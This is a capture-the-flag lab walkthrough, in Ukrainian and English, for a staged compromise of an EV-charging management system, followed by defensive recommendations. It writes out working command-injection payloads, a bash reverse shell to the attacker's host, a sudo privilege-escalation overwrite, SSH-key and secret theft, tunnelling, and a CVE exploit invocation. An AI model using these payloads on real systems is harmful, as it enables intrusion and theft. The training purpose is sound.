# EcoCharge CTF - Attack Flow Documentation v4.2

## Сценарій атаки: Від Command Injection до повного контролю CSMS

**Мета:** Демонстрація повного ланцюжка атаки від web exploitation через Command Injection до компрометації системи управління зарядними станціями (CSMS) через CVE-2025-55182

**Версія:** 4.2  
**Дата оновлення:** Лютий 2025

---

## 1. Attack Path Overview

### 1.1 Sequence Diagram
```mermaid
sequenceDiagram
    autonumber
    participant A as Attacker<br/>Kali Linux
    participant W as Web Server<br/>192.168.250.50
    participant API as API Gateway<br/>192.168.100.20
    participant J as Jump Host<br/>192.168.100.40
    participant G as Grafana<br/>192.168.100.30
    participant CSMS as CitrineOS CSMS<br/>192.168.20.20

    Note over A,W: PHASE 1 - Initial Access via Command Injection
    A->>W: GET /api/qr with invalid format
    W-->>A: Debug info disclosure
    A->>W: Command Injection payload
    W-->>A: RCE as www-data
    Note right of A: FLAG 1
    
    A->>W: Reverse shell payload
    W-->>A: Shell access
    
    A->>W: PrivEsc via backup.js (overwrite)
    W-->>A: Root Access
    Note right of A: FLAG 2
    
    A->>W: Read .env and SSH keys
    W-->>A: API_KEY + id_jumphost
    Note right of A: FLAG 3

    Note over A,API: PHASE 2 - Lateral Movement in DMZ
    A->>API: GET /api/v1/internal/config
    API-->>A: Network topology leak
    Note right of A: FLAG 4
    
    A->>J: SSH with stolen key
    J-->>A: Shell access as operator
    Note right of A: FLAG 5

    Note over A,G: PHASE 3 - Internal Reconnaissance
    A->>J: SSH tunnel to Grafana (port forward via web-panel)
    A->>G: Login with default creds
    G-->>A: Dashboard and Internal IPs
    Note right of A: FLAG 6

    Note over A,CSMS: PHASE 4 - CSMS Compromise via CVE-2025-55182
    A->>J: Access CitrineOS UI
    A->>CSMS: Exploit React2Shell RCE
    CSMS-->>A: RCE on CSMS container
    Note right of A: FLAG 7
    
    A->>CSMS: DB compromise
    CSMS-->>A: Dump of all data
    Note right of A: FLAG 8
    
    A->>CSMS: FINAL FLAG - Secret Partner or Token
    CSMS-->>A: Total control of CSMS and charging processes
    Note right of A: FLAG 9 - FINAL
```

---

## 2. Детальний опис кроків атаки

### PHASE 1: Initial Access (Frontend Zone) 🎯

**Target:** `192.168.250.50` (EcoCharge Web Server)  
**Initial Access Vector:** CWE-78 Command Injection in QR Generator  
**Privileges:** `www-data` → `root`

---

#### Крок 1.1: Reconnaissance

**Мета:** Визначити attack surface та технологічний стек
```bash
# На Kali Linux (192.168.125.228)

# Scan для визначення відкритих портів
nmap -sV -sC -p- 192.168.250.50

# Результат:
# PORT     STATE SERVICE VERSION
# 80/tcp   open  http    nginx 1.24.0
# 443/tcp  open  ssl/http nginx 1.24.0
# 3000/tcp open  http    Node.js (Next.js)

# Web fingerprinting
whatweb http://192.168.250.50:3000

# Directory bruteforce
ffuf -u http://192.168.250.50:3000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Знайдені endpoints:
# /api/stations    ← Public API
# /api/qr          ← QR Generator (VULNERABLE!)
# /api/auth        ← Authentication
# /stations        ← Station listing
```

**Findings:**
- ✅ Next.js 14.2.5 — web portal (не вразлива до CVE-2025-55182)
- ✅ Endpoint `/api/qr` — QR code generator
- ✅ Публічний сайт з інформацією про зарядні станції

---

#### Крок 1.2: Vulnerability Discovery

**Мета:** Знайти вразливість через дослідження функціоналу
```bash
# Крок 1: Відкриваємо http://192.168.250.50:3000/stations/EV-CH-001
# Бачимо кнопку "QR-код" — вона формує запит до /api/qr

# Крок 2: Аналізуємо API запит через DevTools
# Network tab показує: GET /api/qr?station=EV-CH-001&format=png&size=256

# Крок 3: Тестуємо з невалідним форматом для отримання debug-інформації
curl "http://192.168.250.50/api/qr?station=EV-CH-001&format=pdf"

# Результат - Debug Information Disclosure:
{
  "success": false,
  "error": "Unsupported format",
  "supported_formats": ["png", "svg", "eps"],
  "debug": {
    "command_template": "qrencode -s {size} -t {format} -o /tmp/qr_{station}.{format} 'https://ecocharge.ua/station/{station}'",
    "received": {
      "station": "EV-CH-001",
      "size": "256",
      "format": "pdf"
    },
    "hint": "PDF generation is temporarily disabled due to security review",
    "note": "Parameters are passed directly to system command for QR generation"
  }
}

# VULNERABILITY IDENTIFIED!
# Параметр 'station' передається напряму в системну команду без санітизації
```

**Findings:**
- ✅ Debug information disclosure розкриває структуру команди
- ✅ Параметр `station` не санітизується
- ✅ Command Injection через shell metacharacters

---

#### Крок 1.3: Exploitation — Command Injection

**Вразливість:** CWE-78 — OS Command Injection  
**Endpoint:** `GET /api/qr`  
**Parameter:** `station`
```bash
# Тест 1: Підтвердження injection командою 'id'
# Патерн: station=PAYLOAD;COMMAND;%23 де %23=(#) коментує залишок рядка
curl "http://192.168.250.50/api/qr?station=EV-CH-001;id;%23&format=png"

# Результат: uid=33(www-data) — INJECTION CONFIRMED!

# Тест 2: Читання чутливих файлів
# /etc/passwd
curl "http://192.168.250.50/api/qr?station=EV-CH-001;cat+/etc/passwd;%23&format=png"

# /etc/hosts
curl "http://192.168.250.50/api/qr?station=EV-CH-001;cat+/etc/hosts;%23&format=png"

# .env файл веб-сервера
curl "http://192.168.250.50/api/qr?station=EV-CH-001;cat+/var/www/ecocharge/.env;%23&format=png"
curl "http://192.168.250.50/api/qr?station=EV-CH-001;cat+/var/www/ecocharge/.env.local;%23&format=png"

# Тест 3: Reverse Shell
# На Kali запускаємо listener:
nc -lvnp 4444

# Відправляємо payload:
curl "http://192.168.250.50/api/qr?station=EV-CH-001;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.125.228/4444+0>%261';%23&format=png"
```

**Результат:**
```
www-data@web-panel:~/ecocharge$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@web-panel:~/ecocharge$ pwd
/var/www/ecocharge
```

**🏁 FLAG #1:** `FLAG{qr_c0mm4nd_1nj3ct10n}`
```bash
www-data@web-panel:~/ecocharge$ cat /var/www/ecocharge/flag1.txt
FLAG{qr_c0mm4nd_1nj3ct10n}
```

---

#### Крок 1.4: Privilege Escalation

**Вразливість:** Writable sudo-дозволений скрипт  
**Вектор:** `/opt/maintenance/backup.js` — виконується як root через sudo, але файл належить www-data
```bash
# Перевірити sudo rights
www-data@web-panel:~$ sudo -l

# Результат:
User www-data may run the following commands on web-panel:
    (ALL) NOPASSWD: /usr/bin/node /opt/maintenance/backup.js

# Перевірити права на файл
www-data@web-panel:~$ ls -la /opt/maintenance/
# -rw-r--r-- 1 www-data www-data ... backup.js
# Файл належить www-data — можемо перезаписати!

# Переписуємо backup.js своїм кодом
echo "require('child_process').exec('/bin/bash -p', {stdio: 'inherit'})" > /opt/maintenance/backup.js

# Запускаємо через sudo
sudo /usr/bin/node /opt/maintenance/backup.js

# Стабілізуємо shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**Результат:**
```
root@web-panel:/var/www/ecocharge# id
uid=0(root) gid=0(root) groups=0(root)
```

**🏁 FLAG #2:** `FLAG{pr1v3sc_b4ckup_sh3ll}`
```bash
root@web-panel:~# cat /root/.flag2.txt
FLAG{pr1v3sc_b4ckup_sh3ll}
```

---

#### Крок 1.5: Credential Discovery & Loot

**Мета:** Знайти credentials та ключі для lateral movement
```bash
# Читання .env файлу
root@web-panel:~# cat /var/www/ecocharge/.env
```
```
# EcoCharge Portal Configuration
# WARNING: This file contains sensitive credentials!

NODE_ENV=production
PORT=3000

# API Gateway Connection (DMZ Network)
API_GATEWAY_URL=http://192.168.100.20:8080
API_GATEWAY_KEY=ec0ch4rg3_4p1_k3y_2024!
API_GATEWAY_SECRET=s3cr3t_g4t3w4y_t0k3n

# Internal Services (DO NOT EXPOSE!)
CSMS_INTERNAL_URL=http://192.168.20.20:8080
GRAFANA_URL=http://192.168.100.30:3000

# JWT Configuration
JWT_SECRET=3c0ch4rg3_jwt_s3cr3t_k3y_2024_v3ry_l0ng_4nd_s3cur3

# Debug Mode (disable in production!)
DEBUG=true
VERBOSE_ERRORS=true

# CTF Flag (hidden)
FLAG_CREDENTIAL_LEAK=FLAG{cr3d3nt14ls_1n_c0nf1g_f1l3s}
```
```bash
# SSH ключі
root@web-panel:~# ls -la /root/.ssh/
# id_jumphost — приватний ключ для Jump Host
root@web-panel:~# cat /root/.ssh/id_jumphost
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

**🏁 FLAG #3:** `FLAG{cr3d3nt14ls_1n_c0nf1g_f1l3s}`

**Loot Summary:**
| Item | Value | Purpose |
|------|-------|---------|
| API Gateway URL | `http://192.168.100.20:8080` | DMZ access |
| API Key | `ec0ch4rg3_4p1_k3y_2024!` | API authentication |
| CSMS URL | `http://192.168.20.20:8080` | Internal target |
| Grafana URL | `http://192.168.100.30:3000` | Monitoring |
| SSH Key | `id_jumphost` | Jump Host access |
| SSH User | `operator@192.168.100.40` | Jump Host credentials |

---

### PHASE 2: Lateral Movement (DMZ Zone) 🎯

**Target:** DMZ Zone (192.168.100.0/24)  
**Vectors:** API exploitation, SSH pivoting  
**Goals:** Отримати доступ до Jump Host для подальшого pivoting

---

#### Крок 2.1: API Gateway Information Disclosure

**Вразливість:** Exposed internal configuration endpoint
```bash
# Виконується з web-panel (не з Kali — фаєрвол блокує прямий доступ до DMZ)
root@web-panel:~# curl -H "X-API-Key: ec0ch4rg3_4p1_k3y_2024!" \
     "http://192.168.100.20:8080/api/v1/internal/config"

# Результат:
{
  "status": "ok",
  "environment": "production",
  "config": {
    "hasura_endpoint": "http://192.168.20.20:8090/v1/graphql",
    "csms_api": "http://192.168.20.20:8080",
    "csms_ui": "http://192.168.20.20:3000",
    "prometheus": "http://192.168.20.20:9090",
    "jump_host": {
      "ip": "192.168.100.40",
      "user": "operator"
    },
    "network_topology": {
      "dmz": "192.168.100.0/24",
      "internal": "192.168.20.0/24",
      "ot": "172.16.0.0/24"
    }
  },
  "flag": "FLAG{4p1_1nf0_d1scl0sur3}",
  "warning": "This endpoint contains sensitive configuration data"
}
```

**🏁 FLAG #4:** `FLAG{4p1_1nf0_d1scl0sur3}`

---

#### Крок 2.2: SSH Pivot to Jump Host

**Мета:** Отримати доступ до Jump Host для pivoting в Internal зону
```bash
# З web-panel — підключаємося до Jump Host з використанням знайденого ключа
root@web-panel:~# ssh -i /root/.ssh/id_jumphost operator@192.168.100.40

# Banner:
#   EcoCharge Infrastructure - Jump Host
#   Network: DMZ Management (192.168.100.0/24)

operator@jumphost:~$ id
uid=1002(operator) gid=37(operator) groups=37(operator),4(adm),27(sudo)

operator@jumphost:~$ cat FLAG_5.txt
FLAG{jump_h0st_p1v0t}

# Congratulations! You successfully pivoted to the Jump Host.
```

**🏁 FLAG #5:** `FLAG{jump_h0st_p1v0t}`

---

### PHASE 3: Internal Reconnaissance 🎯

**Target:** Grafana (192.168.100.30) та Internal Network  
**Goals:** Збір інформації про внутрішню інфраструктуру

---

#### Крок 3.1: Grafana Access via SSH Tunnel

**Мета:** Отримати доступ до Grafana, яка знаходиться в DMZ і недоступна з Kali напряму
```bash
# Варіант 1 — SSH Local Port Forwarding з web-panel
# Виконується на web-panel (root shell):
root@web-panel:~# ssh -i /root/.ssh/id_jumphost \
    -L 0.0.0.0:8080:192.168.100.30:3000 \
    operator@192.168.100.40 -N -f

# Тепер з Kali відкриваємо браузер:
# http://192.168.250.50:8080 → Grafana (192.168.100.30:3000)

# Варіант 2 — SOCKS Dynamic Proxy з web-panel:
root@web-panel:~# ssh -i /root/.ssh/id_jumphost \
    -D 0.0.0.0:8080 \
    operator@192.168.100.40 -N -f

# Firefox → Settings → Network → Manual proxy:
#   SOCKS Host: 192.168.250.50  Port: 8080
#   SOCKS v5 + "Proxy DNS when using SOCKS v5" ✓
# Тепер браузер бачить всю Internal мережу через тунель
```

> **Примітка щодо фаєрволу:** Порт 8080 на web-panel доступний з Kali завдяки правилу:  
> `iptables -A FORWARD -i $IF_EXT -o $IF_FRONTEND -d $WEB_PORTAL -p tcp --dport 8080 -j ACCEPT`

**Exploitation:**
```bash
# Логін у Grafana з дефолтними credentials
# URL: http://192.168.250.50:8080  (або http://192.168.250.50:8080/login)
# Username: admin
# Password: admin
```

**Findings у Grafana:**
- Dashboard "EcoCharge CSMS Overview" — живі дані системи
- В Settings → Description прихований блок "INTERNAL NOTES":
```
---- INTERNAL NOTES (DO NOT SHARE) ----
CSMS Endpoints:
- CitrineOS UI: http://192.168.20.20:3000
- CSMS Core API: http://192.168.20.20:8080
- Hasura GraphQL: http://192.168.20.20:8090/v1/graphql
- Prometheus: http://192.168.20.20:9090
Jump Host for maintenance: SSH: operator@192.168.100.40
FLAG{gr4f4n4_cl0tH4b_cr39s}
---- END INTERNAL NOTES ----
```

**🏁 FLAG #6:** `FLAG{gr4f4n4_cl0tH4b_cr39s}`

**Information Gathered:**
- ✅ CitrineOS UI: `http://192.168.20.20:3000` (Next.js 15.2.4 — VULNERABLE!)
- ✅ Hasura GraphQL: `http://192.168.20.20:8090/v1/graphql`
- ✅ CSMS Core API: `http://192.168.20.20:8080`
- ✅ Prometheus: `http://192.168.20.20:9090`

---

### PHASE 4: CSMS Compromise (CVE-2025-55182) 🎯

**Target:** CitrineOS CSMS (192.168.20.20)  
**Vulnerability:** CVE-2025-55182 — Next.js Remote Code Execution  
**Goals:** Отримати повний контроль над CSMS

---

#### Крок 4.1: Target Identification
```bash
# Через SOCKS proxy або з Jump Host перевіряємо CSMS
# Next.js версія визначається з HTTP headers або environment variables
operator@jumphost:~$ curl -I http://192.168.20.20:3000
# X-Powered-By: Next.js
# NEXT_VERSION=15.2.4 — VULNERABLE to CVE-2025-55182!
```

**Findings:**
- ✅ CitrineOS Operator UI на порту 3000
- ✅ Next.js 15.2.4 — вразлива до CVE-2025-55182
- ✅ React Server Components enabled

---

#### Крок 4.2: CVE-2025-55182 Exploitation

**Вразливість:** CVE-2025-55182 — Remote Code Execution в Next.js  
**CVSS:** 10.0 (Critical)  
**Type:** Pre-authentication RCE
```bash
# На Kali — запускаємо listener
nc -lvnp 5555

# Запускаємо exploit через SOCKS proxy (192.168.250.50:8080)
cd ~/CVE-2025-55182-exp
python3 exp.py http://192.168.250.50:8080 --revshell 192.168.125.228 5555

# Результат: reverse shell від CSMS контейнера
# uid=65533(nogroup) gid=65533(nogroup) groups=65533(nogroup)
```

**🏁 FLAG #7:** `FLAG{r34ct2sh3ll_csms_pwn3d}`

---

#### Крок 4.3: Credential Extraction
```bash
# Читаємо environment variables контейнера
cat /proc/1/environ | tr '\0' '\n'

# Результат (ключові змінні):
HASURA_ADMIN_SECRET=CitrineOS!
NEXTAUTH_SECRET=CitrineOS-NextAuth-Secret-Key-2024
NEXT_PUBLIC_ADMIN_PASSWORD=Cyber_CitrineOS!
NEXT_PUBLIC_ADMIN_EMAIL=admin@citrineos.com
POSTGRES_PASSWORD=citrine_db_password
NODE_ENV=production
```

**🏁 FLAG #8:** `FLAG{h4sur4_s3cr3t_l34k3d}`

**Credentials Extracted:**
| Credential | Value | Purpose |
|------------|-------|---------|
| HASURA_ADMIN_SECRET | `CitrineOS!` | Full GraphQL admin access |
| POSTGRES_PASSWORD | `citrine_db_password` | Database access |
| Admin Email | `admin@citrineos.com` | UI login |
| Admin Password | `Cyber_CitrineOS!` | UI login |

---

#### Крок 4.4: Full Database Compromise via Hasura GraphQL
```bash
# Підключаємось до Hasura Console через браузер (SOCKS proxy активний):
# http://192.168.250.50:8080/console  (проксює до 192.168.20.20:8090)
# Або через curl:

curl -X POST http://192.168.20.20:8090/v1/graphql \
     -H "Content-Type: application/json" \
     -H "X-Hasura-Admin-Secret: CitrineOS!" \
     -d '{
       "query": "query GetInfrastructure { ChargingStations { id isInline chargePointVendor chargePointModel firmwareVersion locationId tenantId } }"
     }'

# Транзакції
curl -X POST http://192.168.20.20:8090/v1/graphql \
     -H "Content-Type: application/json" \
     -H "X-Hasura-Admin-Secret: CitrineOS!" \
     -d '{
       "query": "query { Transactions(limit: 10, order_by: {createdAt: desc}) { transactionId isActive totalKwh totalCost chargingState stoppedReason } }"
     }'

# RFID авторизації
curl -X POST http://192.168.20.20:8090/v1/graphql \
     -H "Content-Type: application/json" \
     -H "X-Hasura-Admin-Secret: CitrineOS!" \
     -d '{
       "query": "query { Authorizations { idToken idTokenType status groupAuthorizationId } }"
     }'
```

**🏁 FLAG #9 (FINAL):** `FLAG{full_csms_c0mpr0m1s3}`

---

## 3. Attack Summary

### 3.1 Kill Chain Overview
```
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 1: INITIAL ACCESS                                        │
├─────────────────────────────────────────────────────────────────┤
│  1. Discovery       → QR endpoint debug disclosure              │
│  2. Exploitation    → CWE-78 Command Injection                  │
│  3. PrivEsc         → backup.js overwrite (writable by www-data)│
│  4. Credential Loot → API keys + SSH key from .env              │
│                                                                  │
│  FLAGS: #1, #2, #3                                              │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 2: LATERAL MOVEMENT                                      │
├─────────────────────────────────────────────────────────────────┤
│  5. API Gateway     → Information disclosure (/internal/config) │
│  6. SSH Pivot       → Jump Host via stolen id_jumphost key      │
│                                                                  │
│  FLAGS: #4, #5                                                  │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 3: INTERNAL RECONNAISSANCE                               │
├─────────────────────────────────────────────────────────────────┤
│  7. SSH Tunnel      → Port forward або SOCKS proxy via web-panel│
│  8. Grafana Access  → Default credentials admin/admin           │
│  9. Info Gathering  → CSMS endpoints + FLAG in dashboard notes  │
│                                                                  │
│  FLAG: #6                                                       │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 4: CSMS COMPROMISE                                       │
├─────────────────────────────────────────────────────────────────┤
│  10. CVE-2025-55182 → Next.js RCE on CitrineOS CSMS             │
│  11. Cred Extract   → /proc/1/environ → HASURA_ADMIN_SECRET     │
│  12. DB Compromise  → Full GraphQL read/write access            │
│                                                                  │
│  FLAGS: #7, #8, #9                                              │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 Flags Summary

| # | Flag | Location | Method | Difficulty |
|---|------|----------|--------|------------|
| 1 | `FLAG{qr_c0mm4nd_1nj3ct10n}` | Web Server | Command Injection RCE | ⭐⭐ Medium |
| 2 | `FLAG{pr1v3sc_b4ckup_sh3ll}` | Web Server | backup.js overwrite | ⭐⭐⭐ Hard |
| 3 | `FLAG{cr3d3nt14ls_1n_c0nf1g_f1l3s}` | Web Server | .env Credential Discovery | ⭐ Easy |
| 4 | `FLAG{4p1_1nf0_d1scl0sur3}` | API Gateway | Info Disclosure | ⭐⭐ Medium |
| 5 | `FLAG{jump_h0st_p1v0t}` | Jump Host | SSH Pivot | ⭐⭐ Medium |
| 6 | `FLAG{gr4f4n4_cl0tH4b_cr39s}` | Grafana | Default Credentials | ⭐ Easy |
| 7 | `FLAG{r34ct2sh3ll_csms_pwn3d}` | CSMS | CVE-2025-55182 RCE | ⭐⭐⭐⭐ Very Hard |
| 8 | `FLAG{h4sur4_s3cr3t_l34k3d}` | CSMS | /proc/1/environ | ⭐⭐⭐ Hard |
| 9 | `FLAG{full_csms_c0mpr0m1s3}` | CSMS Database | Hasura GraphQL | ⭐⭐⭐ Hard |

### 3.3 Required Skills

- **Web Exploitation:** Command Injection (CWE-78), Information Disclosure
- **Privilege Escalation:** writable sudo script, file overwrite
- **Network Pivoting:** SSH Local Port Forwarding, SOCKS5 Dynamic Proxy
- **API Security:** Information disclosure, authentication bypass
- **Modern Framework Exploitation:** CVE-2025-55182 (Next.js RCE)
- **GraphQL:** Query construction, admin secret exploitation
- **Container Security:** Environment variable extraction via /proc

---

## 4. Defensive Recommendations

### 4.1 Web Application Security
- ✅ Sanitize all user inputs before shell command execution
- ✅ Use parameterized commands instead of string concatenation
- ✅ Disable `DEBUG=true` and `VERBOSE_ERRORS=true` in production
- ✅ Remove unnecessary error details from API responses

### 4.2 Privilege Management
- ✅ Ensure sudo-дозволені скрипти не є writable для непривілейованих користувачів
- ✅ Audit scripts executed with elevated privileges
- ✅ Implement principle of least privilege

### 4.3 Credential Security
- ✅ Use secrets management (Vault, AWS Secrets Manager)
- ✅ Rotate API keys and secrets regularly
- ✅ Don't store SSH keys on web servers
- ✅ Don't store credentials in `.env` files on production servers

### 4.4 Network Security
- ✅ Implement strict network segmentation (фаєрвол блокує External → DMZ/Internal)
- ✅ Monitor lateral movement attempts
- ✅ Restrict SSH tunneling: `AllowTcpForwarding no`, `PermitTunnel no` де можливо

### 4.5 CSMS Security
- ✅ Update Next.js до виправленої версії (CVE-2025-55182)
- ✅ Run containers as non-root
- ✅ Implement WAF rules for React Server Component attacks
- ✅ Change Grafana default credentials
- ✅ Restrict Hasura Console access; use strong unique HASURA_ADMIN_SECRET

---

## 5. Tools Used

### Attacker Tools:
- Kali Linux (pentest distribution)
- nmap, whatweb, ffuf (reconnaissance)
- curl, Burp Suite (API testing)
- netcat (reverse shell listener)
- Python CVE-2025-55182 exploit script
- SSH client (pivoting, tunneling)
- Firefox + FoxyProxy (SOCKS5 browsing)

### Victim Infrastructure:
- Next.js 14.2.5 (web portal — secure version)
- Next.js 15.2.4 (CSMS — vulnerable to CVE-2025-55182)
- Node.js + Express (API Gateway)
- Grafana 10.4.2 (monitoring)
- PostgreSQL 16 (database)
- Hasura GraphQL Engine
- CitrineOS (CSMS)

---

## 6. Навчальна цінність

Сценарій демонструє повний ланцюжок атаки: від OS Command Injection (CWE-78) у веб-порталі через privilege escalation (некоректна sudo-конфігурація), credential harvesting з незахищених конфігураційних файлів, SSH tunneling та SOCKS proxying для обходу сегментації мереж — до експлуатації CVE-2025-55182 у Next.js та повного доступу до бази даних CSMS через Hasura GraphQL API. Це дозволяє учасникам на практиці зрозуміти, як помилки на кожному рівні захисту складаються в єдиний вектор компрометації критичної інфраструктури EV charging.

---

## 7. Version History

| Version | Date | Changes |
|---------|------|---------|
| 4.2 | Feb 2025 | Фінальне узгодження: виправлені команди injection (%23 патерн), backup.js overwrite замість env injection, Kali IP 192.168.125.228, firewall v4.2 (+port 8080), SOCKS proxy варіант, FLAG #3 і #6 оновлено |
| 4.0 | Feb 2025 | Complete rewrite: CWE-78 initial access, CVE-2025-55182 for CSMS |
| 3.0 | Jan 2025 | CVE-2025-55182 for initial access |
| 2.0 | Dec 2024 | Added DMZ components |
| 1.0 | Nov 2024 | Initial scenario |

---

**Document Version:** 4.2  
**Classification:** Educational / CTF  
**Last Updated:** February 2025